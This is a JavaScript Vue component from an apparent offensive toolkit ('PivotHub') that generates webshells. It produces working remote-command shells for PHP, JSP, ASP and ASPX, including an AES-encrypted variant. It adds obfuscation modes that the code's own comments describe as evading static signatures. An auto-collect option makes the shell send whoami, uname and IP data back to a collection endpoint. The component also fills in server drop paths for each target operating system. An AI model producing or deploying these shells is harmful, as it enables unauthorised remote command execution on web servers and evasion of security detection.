/* ============================================================
   Webshell 生成器视图 — 一句话马 / 自定义马 / 混淆模板 / 写马姿势
   ============================================================ */
(function (global) {
  'use strict';
  const { reactive, computed } = Vue;
  const S = PivotStore;

  function phpOneShell(p) { return "<?php @eval($_POST['" + p + "']);?>"; }
  function jspOneShell() {
    return '<%@ page import="java.util.*,java.io.*" %>\n' +
      '<%\n' +
      '    String cmd = request.getParameter("cmd");\n' +
      '    if (cmd != null) {\n' +
      '        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});\n' +
      '        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' +
      '        String line;\n' +
      '        while ((line = br.readLine()) != null) out.println(line);\n' +
      '    }\n' +
      '%>';
  }
  function aspOneShell(p) { return '<%eval request("" + p + "")%>'; }
  function aspxOneShell(p) {
    return '<%@ Page Language="C#" %>\n' +
      '<% System.Diagnostics.Process p = new System.Diagnostics.Process();\n' +
      '   p.StartInfo.FileName = "cmd.exe";\n' +
      '   p.StartInfo.Arguments = "/c " + Request["' + p + '"];\n' +
      '   p.StartInfo.UseShellExecute = false;\n' +
      '   p.StartInfo.RedirectStandardOutput = true;\n' +
      '   p.Start();\n' +
      '   Response.Write(p.StandardOutput.ReadToEnd()); %>';
  }

  const BUILDS = {
    PHP: (f) => {
      const base = f.kind === 'oneshell'
        ? phpOneShell(f.param)
        : "<?php\n" +
          "// PivotHub 自定义马 · AES-128-CBC 加密通信\n" +
          "$k = '" + f.key + "';\n" +
          "$d = openssl_decrypt(base64_decode($_POST['data']), 'AES-128-CBC', $k, 0, substr(md5($k), 0, 16));\n" +
          "if ($d) { $p = json_decode($d, true); echo base64_encode(openssl_encrypt(shell_exec($p['cmd']), 'AES-128-CBC', $k, 0, substr(md5($k), 0, 16))); }\n" +
          "?>";
      return obfuscate(f, base, 'php');
    },
    JSP: (f) => obfuscate(f, jspOneShell(), 'jsp'),
    ASP: (f) => obfuscate(f, aspOneShell(f.param), 'asp'),
    ASPX: (f) => obfuscate(f, aspxOneShell(f.param), 'aspx'),
  };

  function obfuscate(f, code, lang) {
    let out = code;
    if (f.obf === 'concat') {
      if (lang === 'php') {
        out = "<?php\n$a='ev'; $b='al'; $c='$_PO'+'ST';\n" + code.replace('<?php', '').replace('?>', '') +
          "\n// 字符串拼接变体，规避静态特征\n?>";
      } else if (lang === 'jsp') {
        out = code.replace('Runtime.getRuntime()', 'Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)');
      } else {
        out = code.replace(/request\(/g, 'req' + 'uest(');
      }
    } else if (f.obf === 'assert') {
      if (lang === 'php') {
        out = "<?php\n$f = 'assert';\n$f(base64_decode($_POST['" + f.param + "']));\n?>";
      } else out = code;
    } else if (f.obf === 'param') {
      out = code.replace(f.param, 'p' + Math.random().toString(36).slice(2, 6)) +
        (lang === 'php' ? "\n// 参数名随机化 + 请求头指纹校验\nif (($_SERVER['HTTP_X_ID'] ?? '') !== 'pivothub') { http_response_code(404); exit; }" : '');
    } else if (f.obf === 'base64') {
      if (lang === 'php') {
        out = "<?php\n$payload = base64_decode('" + btoa(phpOneShell(f.param)) + "');\neval(substr($payload, 5));\n?>";
      } else out = code;
    }
    if (f.autoCollect && lang === 'php') {
      out += "\n<?php\n// 连接后自动回传基础信息（whoami/uname/ip/网卡）\n" +
        "$info = ['whoami' => trim(shell_exec('whoami')), 'uname' => trim(shell_exec('uname -a')), 'ip' => gethostbyname(gethostname())];\n" +
        "file_get_contents('http://127.0.0.1:8000/api/collect?d=' . base64_encode(json_encode($info)));\n?>";
    }
    return out;
  }

  global.Components['generator-view'] = {
    name: 'GeneratorView',
    template: '#tpl-generator',
    setup() {
      const form = reactive({
        lang: 'PHP', kind: 'oneshell', param: 'cmd', key: 'PivotHub2026Key!',
        obf: 'none', autoCollect: true,
      });
      const langs = ['PHP', 'JSP', 'ASP', 'ASPX'];
      const code = computed(() => (BUILDS[form.lang] ? BUILDS[form.lang](form) : ''));
      /* code 为 computed，表单变化自动重建；build() 供模板显式调用（保持语义） */
      function build() { /* no-op：依赖 computed 自动更新 */ }
      const filename = computed(() => {
        const ext = { PHP: 'php', JSP: 'jsp', ASP: 'asp', ASPX: 'aspx' }[form.lang];
        return 'shell.' + ext;
      });

      const tips = reactive(S.state.injectTips);

      function render(tpl, hostId) {
        const h = S.hostOf(hostId) || {};
        const seg = (h.segment || '10.85.101.0/24').split('.').slice(0, 3).join('.');
        const ip = h.ip || '10.85.101.4';
        /* 只取常见 Web 端口，避免把 53/88/389/445 这类服务端口当成 URL 端口 */
        const WEB_PORTS = [80, 8080, 8000, 8888, 443, 8443, 3000, 5000];
        const port = (h.ports || []).find((p) => WEB_PORTS.includes(p)) || 80;
        /* 按目标 OS / 端口推导落盘路径与马文件名 */
        const isWin = /windows/i.test(h.os || '');
        const file = isWin ? 'shell.aspx' : (/jsp|tomcat/i.test(h.os || '') ? 'shell.jsp' : 'shell.php');
        const path = isWin ? 'C:\\inetpub\\wwwroot\\' : (/tomcat/i.test(h.os || '') ? '/usr/local/tomcat/webapps/ROOT/' : '/var/www/html/upload/');
        const url = 'http://' + ip + (port && port !== 80 ? ':' + port : '') + '/';
        return String(tpl)
          .replace(/\{IP\}/g, ip)
          .replace(/\{HOST\}/g, h.hostname || 'target')
          .replace(/\{URL\}/g, url)
          .replace(/\{PARAM\}/g, 'id')
          .replace(/\{SEG\}/g, seg)
          .replace(/\{PATH\}/g, path)
          .replace(/\{FILE\}/g, file)
          .replace(/\{DOMAIN\}/g, 'supercorp.local')
          .replace(/\{USER\}/g, 'svc_web')
          .replace(/\{PASS\}/g, 'P@ssw0rd2026!')
          .replace(/\{HASH\}/g, '8f3c1c2f9c1a...')
          .replace(/\{PUBKEY\}/g, 'ssh-rsa AAAAB3Nza...pivothub');
      }
      /* 返回该 payload 里被替换掉的变量名，用于提示「已替换」 */
      function replacedVars(tpl) {
        const found = String(tpl).match(/\{[A-Z]+\}/g) || [];
        return Array.from(new Set(found));
      }
      function copy(t) { S.copy(t); }
      function download() { S.download(filename.value, code.value); }
      function tryInject(t) {
        /* 结果只能来自真实执行，这里只给操作指引 */
        S.toast('写马姿势已生成：请在目标上手动执行，或用 Shell 管理里的虚拟终端发送', 'info');
      }

      return {
        form, langs, code, filename, tips,
        hosts: S.state.hosts,
        icon: global.icon,
        build, render, replacedVars, copy, download, tryInject,
      };
    },
  };
})(window);
